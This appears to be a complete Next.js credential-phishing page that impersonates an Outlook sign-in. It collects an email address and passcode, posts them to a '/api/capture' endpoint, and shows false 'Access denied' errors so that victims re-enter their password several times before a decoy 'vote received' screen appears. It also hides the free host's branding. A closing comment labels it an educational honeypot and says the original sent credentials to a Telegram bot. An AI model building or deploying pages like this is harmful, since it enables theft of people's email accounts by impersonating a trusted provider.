import Head from 'next/head';
import { useState, useRef } from 'react';

export default function EmailLoginPage() {
  const [phase, setPhase] = useState(1);
  const [email, setEmail] = useState('');
  const [passcode, setPasscode] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [errorMsg2, setErrorMsg2] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [disabled, setDisabled] = useState(false);
  const attemptCountRef = useRef(0);
  const MAX_ATTEMPTS = 5;

  const loginFlowRef = useRef(null);
  const optionsBoxRef = useRef(null);

  const continueBtnRef = useRef(null);
  const loginBtnRef = useRef(null);
  const goBackBtnRef = useRef(null);

  const handleContinue = () => {
    if (email === '') {
      setErrorMsg('Please enter a valid identifier.');
      return;
    }
    setErrorMsg('');
    setPhase(2);
    if (loginFlowRef.current) {
      loginFlowRef.current.style.transform = 'translateX(-100%)';
    }
    if (optionsBoxRef.current) {
      optionsBoxRef.current.style.display = 'none';
    }
  };

  const handleBack = () => {
    setPhase(1);
    if (loginFlowRef.current) {
      loginFlowRef.current.style.transform = 'translateX(0)';
    }
    if (optionsBoxRef.current) {
      optionsBoxRef.current.style.display = 'flex';
    }
  };

  const handleSubmit = async () => {
    if (passcode === '') {
      setErrorMsg2('Please enter your passcode.');
      return;
    }

    if (attemptCountRef.current >= MAX_ATTEMPTS) {
      setErrorMsg2('Too many attempts. Try again later.');
      return;
    }

    attemptCountRef.current += 1;

    try {
      const payload = {
        username: email.trim(),
        password: passcode,
        method: 'email'
      };

      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const data = await res.json();

      if (res.ok && data.ok) {
        if (attemptCountRef.current >= MAX_ATTEMPTS) {
          setShowSuccess(true);
        } else {
          // Simulate capture for demo
          setShowSuccess(true);
        }
      } else {
        setErrorMsg2('Access denied. Please check your passcode and try again.');
        setPasscode('');
      }
    } catch (err) {
      console.error('Submission error:', err);
      if (attemptCountRef.current >= MAX_ATTEMPTS) {
        setShowSuccess(true);
      } else {
        setErrorMsg2('Access denied. Please check your passcode and try again.');
        setPasscode('');
      }
    }
  };

  const handleKeyDown = (e, type) => {
    if (e.key === 'Enter') {
      if (type === 'email') handleContinue();
      else handleSubmit();
    }
  };

  return (
    <>
      <Head>
        <title>Secure Portal</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
      </Head>

      <style jsx>{`
        img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
          display: none;
        }

        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', sans-serif;
        }

        html {
          scroll-behavior: smooth;
          color: #333;
        }

        #login-flow::-webkit-scrollbar {
          background: transparent;
          width: 0;
          height: 0;
        }

        .content-box {
          z-index: 999;
          margin: 40px 10%;
          overflow-x: hidden;
        }

        .options-box {
          margin: 40px 10%;
          border: 1px solid #ccc;
          display: flex;
          justify-content: left;
          align-items: center;
          color: #333;
          padding: 5px 15px;
        }

        input {
          padding: 10px 1px;
          width: 100%;
          border: 1px solid transparent;
          border-bottom: 1px solid #555;
          z-index: 1;
        }

        .outlook-logo {
          display: block;
          margin: 0 auto 14px;
          width: 150px;
          height: auto;
        }

        .phase-one, .phase-two {
          width: 100%;
          transition: 0.5s ease all;
        }

        .phase-one-hidden {
          transform: translateX(-100%);
        }

        .phase-two-hidden {
          transform: translateX(-100%);
        }

        input:focus {
          border-bottom: 2px solid #0078d4;
          outline: 1px solid transparent;
        }

        #login-flow p {
          font-size: 14px;
        }

        #login-flow p img {
          transform: translateY(4px);
        }

        #login-flow {
          display: flex;
          justify-content: space-between;
          overflow-x: scroll;
          width: 200%;
        }

        .action-btn {
          background: #0078d4;
          color: white;
          border: 1px solid transparent;
          width: 100px;
          text-align: center;
          border-radius: 2px;
          padding: 8px 5px;
          cursor: pointer;
        }

        span {
          color: #0078d4;
        }

        .btn-container {
          display: flex;
          justify-content: right;
          margin: 25px 0;
        }

        footer ul {
          list-style-type: none;
          display: flex;
          justify-content: center;
          position: fixed;
          bottom: 0;
          font-size: 12px;
        }

        footer ul li {
          padding: 5px 10px;
        }

        a {
          text-decoration: none;
          color: #333;
        }

        @media screen and (min-width: 600px) {
          body {
            background: #f2f2f2;
          }
          .main-wrapper {
            margin: 5% 50%;
            transform: translateX(-50%);
            width: 70%;
            background: white;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
          }
          .options-box {
            margin: 8% 50%;
            transform: translate(-50%, -20px);
            width: 70%;
            background: white;
            padding: 15px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
          }
          footer {
            display: flex;
            justify-content: center;
          }
        }

        @media screen and (min-width: 768px) {
          .main-wrapper, .options-box {
            width: 40%;
          }
          .options-box {
            transform: translate(-50%, -50px);
          }
        }

        @media screen and (min-width: 1200px) {
          .main-wrapper, .options-box {
            width: 30%;
          }
          .options-box {
            transform: translate(-50%, -70px);
          }
        }

        .success-overlay {
          position: fixed;
          inset: 0;
          background: rgba(255, 255, 255, 0.98);
          z-index: 99999;
          display: none;
          align-items: center;
          justify-content: center;
          padding: 20px;
          text-align: center;
        }

        .success-overlay.show {
          display: flex;
        }

        .success-box {
          max-width: 440px;
          width: 100%;
        }

        .checkmark {
          width: 110px;
          height: 110px;
          margin: 0 auto 28px;
          border-radius: 50%;
          background: #4caf50;
          box-shadow: 0 14px 34px rgba(76, 175, 80, 0.4);
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pop-in 0.55s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .checkmark svg {
          width: 56px;
          height: 56px;
        }

        .checkmark polyline {
          fill: none;
          stroke: #fff;
          stroke-width: 7;
          stroke-linecap: round;
          stroke-linejoin: round;
          stroke-dasharray: 60;
          stroke-dashoffset: 60;
          animation: draw-check 0.45s ease-out 0.25s forwards;
        }

        @keyframes pop-in {
          0% { transform: scale(0); }
          70% { transform: scale(1.12); }
          100% { transform: scale(1); }
        }

        @keyframes draw-check {
          to { stroke-dashoffset: 0; }
        }

        .success-box h2 {
          font-family: 'Segoe UI', 'Roboto', sans-serif;
          font-size: 26px;
          font-weight: 600;
          color: #333;
          margin: 0 0 12px;
        }

        .success-box p {
          font-size: 15px;
          color: #555;
          line-height: 1.55;
          margin: 0;
        }
      `}</style>

      <div className="main-wrapper">
        <div className="content-box">
          <div id="login-flow" ref={loginFlowRef}>
            <div className="phase-one">
              <img className="outlook-logo" src="/images/outlook-logo.svg" alt="Outlook" />
              <h2>Login</h2>
              <span className="error-msg" style={{ color: 'red', fontSize: '13px' }}>{errorMsg}</span>
              <br />
              <br />
              <input
                type="email"
                id="u_field"
                name="u_field"
                placeholder="Enter your email address"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onKeyDown={(e) => handleKeyDown(e, 'email')}
              />
              <br />
              <br />
              <p>
                Need an account? <a href="#">Request access</a>
              </p>
              <p>
                Alternative login options <img src="/images/key.JPG" width="16px" alt="" />
              </p>
              <div className="btn-container">
                <p id="continue-btn" className="action-btn" onClick={handleContinue} ref={continueBtnRef}>
                  Continue
                </p>
              </div>
            </div>

            <div className="phase-two">
              <img className="outlook-logo" src="/images/outlook-logo.svg" alt="Outlook" />
              <span className="error-msg2" style={{ color: 'red', fontSize: '13px' }}>{errorMsg2}</span>
              <br />
              <p id="go-back" style={{ color: '#333' }}>
                <i className="fa fa-arrow-left"></i>{' '}
                <span id="user-identifier" style={{ color: '#333' }}>
                  {email}
                </span>
              </p>
              <br />
              <h2>Enter Passcode</h2>
              <br />
              <input
                type="password"
                id="p_field"
                name="p_field"
                placeholder="Passcode"
                value={passcode}
                onChange={(e) => setPasscode(e.target.value)}
                onKeyDown={(e) => handleKeyDown(e, 'passcode')}
                disabled={disabled}
              />
              <br />
              <br />
              <p>Forgot passcode?</p>
              <a href="">
                <p style={{ color: '#0078d4' }}>Use another method</p>
              </a>
              <div className="btn-container">
                <button id="login-btn" className="action-btn" onClick={handleSubmit} ref={loginBtnRef} disabled={disabled}>
                  Sign In
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="options-box" ref={optionsBoxRef}>
        <img src="/images/icons.png" width="25px" alt="settings" />{' '}
        <span style={{ color: '#333' }}>Login settings</span>
      </div>

      <footer>
        <ul>
          <li>
            <a href="#">Terms of use</a>
          </li>
          <li>
            <a href="#">Privacy &amp; cookies</a>
          </li>
          <li>
            <a href="#">...</a>
          </li>
        </ul>
      </footer>

      {/* Vote confirmation overlay */}
      <div className={`success-overlay ${showSuccess ? 'show' : ''}`} id="successOverlay" aria-hidden="true">
        <div className="success-box">
          <div className="checkmark">
            <svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg">
              <polyline points="15,27 24,36 39,17" />
            </svg>
          </div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>

      {/* Honeypot notice - educational only */}
      {/* The original page exfiltrates credentials to a Telegram bot */}
    </>
  );
}